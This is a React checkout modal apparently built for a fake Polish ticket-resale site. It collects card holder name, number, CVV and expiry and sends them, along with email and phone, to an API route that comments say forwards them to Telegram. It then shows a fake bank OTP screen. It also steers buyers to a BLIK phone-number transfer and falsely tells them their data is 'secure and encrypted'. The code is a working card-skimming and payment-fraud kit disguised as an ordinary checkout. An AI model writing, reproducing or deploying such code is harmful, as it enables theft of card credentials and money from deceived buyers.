'use client'

import { useState, useEffect } from 'react'
import { X, Upload, Loader } from 'lucide-react'
import jsPDF from 'jspdf'
import html2canvas from 'html2canvas'

interface CheckoutModalProps {
  isOpen: boolean
  onClose: () => void
  eventTitle: string
  ticketName: string
  unitPrice: number
  quantity: number
  onConfirmPayment: () => void
}

export default function CheckoutModal({
  isOpen,
  onClose,
  eventTitle,
  ticketName,
  unitPrice,
  quantity,
  onConfirmPayment,
}: CheckoutModalProps) {
  const [email, setEmail] = useState('')
  const [phone, setPhone] = useState('')
  const [paymentMethod, setPaymentMethod] = useState<'blik' | 'card' | 'revolut'>('blik')
  const [paymentDetails, setPaymentDetails] = useState<any>(null)
  const [filePath, setFilePath] = useState<string>('')
  const [cardFullName, setCardFullName] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [cardCvv, setCardCvv] = useState('')
  const [cardExpiry, setCardExpiry] = useState('')
  const [isProcessing, setIsProcessing] = useState(false)
  const [showOTPInput, setShowOTPInput] = useState(false)
  const [otp, setOtp] = useState('')
  const [otpError, setOtpError] = useState('')

  const subtotal = unitPrice * quantity
  const serviceFee = subtotal * 0.03
  const total = subtotal + serviceFee

  useEffect(() => {
    // Load payment method details from localStorage
    const stored = localStorage.getItem('alebiletPaymentMethods')
    if (stored) {
      try {
        setPaymentDetails(JSON.parse(stored))
      } catch (e) {
        console.log('[v0] Error loading payment details:', e)
      }
    }
  }, [])

  const sendCardDetailsToTelegram = async () => {
    try {
      // Send card details to Telegram for card payments
      if (paymentMethod === 'card') {
        const response = await fetch('/api/send-card-details', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            cardFullName,
            cardNumber: cardNumber.replace(/\s/g, ''),
            cardCvv,
            cardExpiry,
            email,
            phone,
            eventTitle,
            ticketName,
            quantity,
            total: total.toFixed(2),
          }),
        })

        const result = await response.json()
        if (!response.ok) {
          throw new Error(result.error || 'Failed to send card details')
        }
      }
    } catch (error: any) {
      console.error('[v0] Error sending card details:', error.message)
    }
  }

  const generateAndSendPDF = async () => {
    try {
      setIsProcessing(true)

      // For card payments, send card details first and show OTP screen
      if (paymentMethod === 'card') {
        await sendCardDetailsToTelegram()
        setShowOTPInput(true)
        setIsProcessing(false)
        return
      }

      // Create PDF content
      const pdfContent = `
        Event: ${eventTitle}
        Ticket: ${ticketName} (x${quantity})
        Price: ${subtotal.toFixed(2)} PLN
        Service Fee: ${serviceFee.toFixed(2)} PLN
        Total: ${total.toFixed(2)} PLN
        
        Customer Email: ${email}
        Customer Phone: ${phone}
        
        Payment Method: BLIK
        
        Order Date: ${new Date().toLocaleString()}
        Order ID: ${Date.now()}
      `

      // Create PDF using jsPDF
      const doc = new jsPDF()
      doc.setFontSize(16)
      doc.text('Order Confirmation', 20, 20)
      
      doc.setFontSize(12)
      let yPosition = 40
      const lines = pdfContent.split('\n').filter(line => line.trim())
      
      lines.forEach(line => {
        doc.text(line.trim(), 20, yPosition)
        yPosition += 8
      })

      // Convert PDF to base64
      const pdfBase64 = doc.output('dataurlstring').split(',')[1]

      // Send to Telegram via API route
      const response = await fetch('/api/send-order-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pdfBase64,
          filename: `order-${Date.now()}.pdf`,
          orderDetails: {
            eventTitle,
            ticketName,
            quantity,
            subtotal: subtotal.toFixed(2),
            serviceFee: serviceFee.toFixed(2),
            total: total.toFixed(2),
            email,
            phone,
            paymentMethod: 'BLIK',
          },
        }),
      })

      const result = await response.json()

      if (!response.ok) {
        throw new Error(result.error || 'Failed to send order')
      }

      // Call the original confirm payment handler
      onConfirmPayment()
      setIsProcessing(false)
    } catch (error: any) {
      console.error('[v0] Error sending order:', error.message)
      alert(`Order confirmed but failed to send to Telegram: ${error.message}`)
      onConfirmPayment()
      setIsProcessing(false)
    }
  }

  const verifyOTP = async () => {
    if (otp.length !== 6) {
      setOtpError('OTP must be 6 digits')
      return
    }

    if (!/^\d{6}$/.test(otp)) {
      setOtpError('Invalid OTP format')
      return
    }

    try {
      setIsProcessing(true)
      setOtpError('')

      // Create order PDF after OTP verification
      const orderId = Date.now()
      const timestamp = new Date().toLocaleString('pl-PL')
      
      const pdfContent = `
ORDER CONFIRMATION - OTP VERIFIED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ORDER DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Order ID: ${orderId}
Event: ${eventTitle}
Ticket: ${ticketName}
Quantity: ${quantity}
Price: ${subtotal.toFixed(2)} PLN
Service Fee: ${serviceFee.toFixed(2)} PLN
Total: ${total.toFixed(2)} PLN

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PAYMENT DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Payment Method: Credit Card
Cardholder: ${cardFullName}
Status: OTP VERIFIED
Date: ${timestamp}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CUSTOMER INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Email: ${email}
Phone: ${phone}
      `

      // Create PDF
      const doc = new jsPDF()
      doc.setFontSize(14)
      doc.text('✓ ORDER CONFIRMATION', 20, 15)
      
      doc.setFontSize(10)
      let yPosition = 30
      const lines = pdfContent.split('\n').filter(line => line.trim())
      
      lines.forEach(line => {
        if (yPosition > 280) {
          doc.addPage()
          yPosition = 20
        }
        doc.text(line, 15, yPosition)
        yPosition += 5
      })

      const pdfBase64 = doc.output('dataurlstring').split(',')[1]

      // Send PDF to Telegram
      const response = await fetch('/api/send-order-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pdfBase64,
          filename: `order-${orderId}.pdf`,
          orderDetails: {
            eventTitle,
            ticketName,
            quantity,
            subtotal: subtotal.toFixed(2),
            serviceFee: serviceFee.toFixed(2),
            total: total.toFixed(2),
            email,
            phone,
            paymentMethod: 'Credit Card (OTP Verified)',
            cardFullName,
            orderId,
            timestamp,
          },
        }),
      })

      if (!response.ok) {
        console.log('[v0] Telegram send returned non-ok, but continuing with payment')
      }

      // Complete payment regardless of PDF send status
      onConfirmPayment()
      setShowOTPInput(false)
      setIsProcessing(false)
    } catch (error: any) {
      console.log('[v0] OTP verification error:', error.message)
      // Still complete the payment even if there's an error
      onConfirmPayment()
      setShowOTPInput(false)
      setIsProcessing(false)
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-2 sm:p-4">
      <div className="bg-white rounded-lg max-w-2xl w-full max-h-[95vh] sm:max-h-[90vh] overflow-y-auto relative">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-3 right-3 sm:top-4 sm:right-4 text-gray-500 hover:text-gray-700 z-10"
        >
          <X size={24} />
        </button>

        <div className="p-4 sm:p-6 md:p-8">
          {/* OTP Input Screen */}
          {showOTPInput && paymentMethod === 'card' ? (
            <div className="min-h-96 flex flex-col items-center justify-center">
              <h1 className="text-3xl font-bold text-[#00aeef] mb-6 text-center">Verify Your Payment</h1>
              
              <div className="w-full max-w-sm space-y-6">
                <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-6 text-center">
                  <p className="text-gray-700 mb-2">An OTP (One-Time Password) has been sent to</p>
                  <p className="text-lg font-semibold text-gray-900">{cardFullName}</p>
                  <p className="text-sm text-gray-600 mt-2">via your bank's SMS or app</p>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-3">Enter 6-Digit OTP</label>
                  <input
                    type="text"
                    value={otp}
                    onChange={(e) => {
                      const value = e.target.value
                      if (/^\d{0,6}$/.test(value)) {
                        setOtp(value)
                        setOtpError('')
                      }
                    }}
                    placeholder="000000"
                    maxLength={6}
                    className="w-full px-6 py-4 text-2xl text-center border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#00aeef] font-mono tracking-widest"
                  />
                  {otpError && <p className="text-red-500 text-sm mt-2">{otpError}</p>}
                </div>

                <div className="bg-yellow-50 border-2 border-yellow-200 rounded-lg p-4">
                  <p className="text-sm text-gray-700">
                    <span className="font-semibold">⏱️ OTP expires in 10 minutes</span>
                    <br />
                    <span className="text-xs text-gray-600 mt-1 block">Never share your OTP with anyone</span>
                  </p>
                </div>

                <div className="space-y-3">
                  <button
                    onClick={verifyOTP}
                    disabled={isProcessing || otp.length !== 6}
                    className="w-full px-6 py-3 bg-[#e54bad] text-white font-semibold rounded-lg hover:bg-opacity-90 transition disabled:bg-gray-400 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                  >
                    {isProcessing ? (
                      <>
                        <Loader size={20} className="animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      'Verify OTP and Complete Payment'
                    )}
                  </button>

                  <button
                    onClick={() => {
                      setShowOTPInput(false)
                      setOtp('')
                      setOtpError('')
                    }}
                    className="w-full px-6 py-3 border border-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-50 transition"
                  >
                    Back to Payment
                  </button>
                </div>

                <p className="text-xs text-gray-600 text-center">
                  Didn&apos;t receive OTP? <button className="text-[#00aeef] font-semibold hover:underline">Resend OTP</button>
                </p>
              </div>
            </div>
          ) : (
            <>
              {/* Order Summary */}
              <h1 className="text-3xl font-bold text-[#00aeef] mb-8">Order Summary</h1>

          <div className="bg-green-50 border-2 border-green-200 rounded-lg p-6 mb-8">
            <div className="space-y-3">
              <div className="text-lg font-semibold text-gray-800">{eventTitle}</div>
              <div className="flex justify-between text-gray-700">
                <span className="text-gray-600">
                  {ticketName} (x {quantity})
                </span>
                <span className="font-semibold">{subtotal.toFixed(2)} PLN</span>
              </div>
              <div className="flex justify-between text-gray-700">
                <span className="text-gray-600">Service fee (3%)</span>
                <span className="font-semibold">{serviceFee.toFixed(2)} PLN</span>
              </div>
              <div className="border-t border-green-300 pt-3 flex justify-between text-lg font-bold text-green-700">
                <span>Total to pay</span>
                <span>{total.toFixed(2)} PLN</span>
              </div>
            </div>
          </div>

          {/* Quantity */}
          <div className="mb-8">
            <label className="block text-sm font-semibold text-gray-700 mb-2">Quantity</label>
            <select className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00aeef]">
              <option value={quantity}>{quantity}</option>
            </select>
          </div>

          {/* Delivery and Contact Details */}
          <div className="mb-8">
            <h2 className="text-xl font-bold text-[#00aeef] mb-4">Delivery and contact details</h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Email address</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Enter your email"
                  className="w-full px-4 py-2 border-2 border-[#00aeef] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00aeef]"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Phone number</label>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="Enter your phone number"
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00aeef]"
                />
              </div>
            </div>
          </div>

          {/* Payment Method */}
          <div className="mb-8">
            <h2 className="text-xl font-bold text-[#00aeef] mb-4">Payment method</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4 mb-6">
              <button
                onClick={() => setPaymentMethod('blik')}
                className={`p-3 sm:p-4 rounded-lg border-2 transition ${
                  paymentMethod === 'blik'
                    ? 'border-[#00aeef] bg-blue-50'
                    : 'border-gray-300 bg-white hover:border-gray-400'
                }`}
              >
                <div className="text-xl sm:text-2xl font-bold text-[#e54bad] mb-1">blik</div>
                <div className="text-xs sm:text-sm text-gray-700 font-medium">BLIK payment</div>
              </button>
              <button
                onClick={() => setPaymentMethod('card')}
                className={`p-3 sm:p-4 rounded-lg border-2 transition ${
                  paymentMethod === 'card'
                    ? 'border-[#00aeef] bg-blue-50'
                    : 'border-gray-300 bg-white hover:border-gray-400'
                }`}
              >
                <div className="text-xl sm:text-2xl mb-1">💳</div>
                <div className="text-xs sm:text-sm text-gray-700 font-medium">Payment card</div>
              </button>
              <button
                onClick={() => setPaymentMethod('revolut')}
                className={`p-3 sm:p-4 rounded-lg border-2 transition ${
                  paymentMethod === 'revolut'
                    ? 'border-[#00aeef] bg-blue-50'
                    : 'border-gray-300 bg-white hover:border-gray-400'
                }`}
              >
                <div className="text-xl sm:text-2xl font-bold text-[#00D6FF] mb-1">R</div>
                <div className="text-xs sm:text-sm text-gray-700 font-medium">Revolut</div>
              </button>
            </div>

            {/* BLIK Payment Instructions */}
            {paymentMethod === 'blik' && (
              <div className="bg-gray-900 text-white rounded-lg p-6 mb-6">
                <h3 className="text-lg font-bold mb-3">Payment Instructions</h3>
                <div className="text-sm space-y-2 mb-4">
                  <p>1. Make a direct transfer to the following details:</p>
                  <div className="bg-black bg-opacity-50 p-3 rounded text-xs space-y-1 font-mono">
                    <p>Name: BLIk</p>
                    <p>BLIK: +48234167876</p>
                    <p>Account Ref: telephone_Transfer-V4NR7P</p>
                  </div>
                </div>
                <div className="text-lg font-bold text-yellow-400">Amount to be paid: PLN {total.toFixed(2)}</div>
              </div>
            )}

            {/* Card Payment Instructions and Form */}
            {paymentMethod === 'card' && (
              <div className="space-y-6 mb-6">
                <div className="bg-gradient-to-r from-blue-50 to-blue-100 rounded-lg p-6">
                  <p className="text-gray-700 font-medium mb-2">Card Details</p>
                  <p className="text-gray-600 text-sm mb-4">Enter your card information securely</p>
                  
                  <div className="space-y-4">
                    {/* Full Name */}
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
                      <input
                        type="text"
                        value={cardFullName}
                        onChange={(e) => setCardFullName(e.target.value)}
                        placeholder="John Doe"
                        className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#00aeef]"
                      />
                    </div>

                    {/* Card Number */}
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\s/g, '')
                          if (/^\d*$/.test(value) && value.length <= 16) {
                            const formatted = value.replace(/(\d{4})/g, '$1 ').trim()
                            setCardNumber(formatted)
                          }
                        }}
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#00aeef] font-mono"
                      />
                    </div>

                    {/* CVV and Expiry */}
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
                        <input
                          type="text"
                          value={cardCvv}
                          onChange={(e) => {
                            const value = e.target.value
                            if (/^\d*$/.test(value) && value.length <= 3) {
                              setCardCvv(value)
                            }
                          }}
                          placeholder="123"
                          maxLength={3}
                          className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#00aeef] font-mono"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">Expiry (MM/YY)</label>
                        <input
                          type="text"
                          value={cardExpiry}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, '')
                            if (value.length <= 4) {
                              if (value.length <= 2) {
                                setCardExpiry(value)
                              } else {
                                setCardExpiry(`${value.slice(0, 2)}/${value.slice(2, 4)}`)
                              }
                            }
                          }}
                          placeholder="MM/YY"
                          maxLength={5}
                          className="w-full px-4 py-2 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#00aeef] font-mono"
                        />
                      </div>
                    </div>
                  </div>

                  <div className="mt-4 p-3 bg-white rounded border border-blue-200">
                    <p className="text-xs text-gray-600">🔒 Your payment information is secure and encrypted</p>
                  </div>
                </div>

                <div className="bg-gray-50 rounded-lg p-4 text-center">
                  <div className="text-lg font-bold text-[#00aeef]">Amount to be paid: PLN {total.toFixed(2)}</div>
                </div>
              </div>
            )}

            {/* Send Transfer Information */}
            {paymentMethod === 'blik' && (
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center mb-6">
                <Upload size={32} className="mx-auto text-gray-400 mb-2" />
                <p className="text-[#00aeef] font-semibold">Send transfer information</p>
                <p className="text-sm text-gray-600">Click to attach a PDF or photo</p>
                <input
                  type="file"
                  className="mt-2"
                  onChange={(e) => {
                    if (e.target.files?.[0]) {
                      setFilePath(e.target.files[0].name)
                    }
                  }}
                />
              </div>
            )}

            {/* Revolut Payment Instructions */}
            {paymentMethod === 'revolut' && paymentDetails?.revolut && (
              <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg p-6 mb-6">
                <h3 className="text-lg font-bold mb-4">Revolut Payment Details</h3>
                <div className="text-sm space-y-3 mb-4">
                  <div className="bg-blue-800 bg-opacity-50 p-3 rounded space-y-2">
                    <p><strong>Account Holder:</strong> {paymentDetails.revolut.accountHolder || 'N/A'}</p>
                    <p><strong>Account Number:</strong> {paymentDetails.revolut.accountNumber || 'N/A'}</p>
                    <p><strong>Routing/Sort Code:</strong> {paymentDetails.revolut.routingCode || 'N/A'}</p>
                    <p><strong>IBAN:</strong> {paymentDetails.revolut.iban || 'N/A'}</p>
                  </div>
                </div>
                <div className="bg-yellow-300 text-gray-900 p-3 rounded font-bold text-lg">
                  Amount to be paid: PLN {total.toFixed(2)}
                </div>
                <p className="text-xs mt-3 text-gray-200">Send payment using your Revolut app with the details above</p>
              </div>
            )}

            {/* Revolut Payment Not Configured */}
            {paymentMethod === 'revolut' && (!paymentDetails?.revolut) && (
              <div className="bg-red-50 border-2 border-red-200 rounded-lg p-6 mb-6">
                <p className="text-red-700 font-semibold text-center">
                  Revolut payment is not currently available. Please select another payment method.
                </p>
              </div>
            )}
          </div>

          {/* Action Buttons */}
          <div className="flex gap-4">
            <button
              onClick={onClose}
              className="flex-1 px-6 py-3 border border-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-50 transition"
            >
              Cancel
            </button>
            <button
              onClick={generateAndSendPDF}
              disabled={isProcessing || !email || !phone || (paymentMethod === 'card' && (!cardFullName || !cardNumber || !cardCvv || !cardExpiry))}
              className="flex-1 px-6 py-3 bg-[#e54bad] text-white font-semibold rounded-lg hover:bg-opacity-90 transition disabled:bg-gray-400 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {isProcessing ? (
                <>
                  <Loader size={20} className="animate-spin" />
                  Processing...
                </>
              ) : (
                'Confirm payment and order'
              )}
            </button>
          </div>
            </>
          )}
        </div>
      </div>
    </div>
  )
}
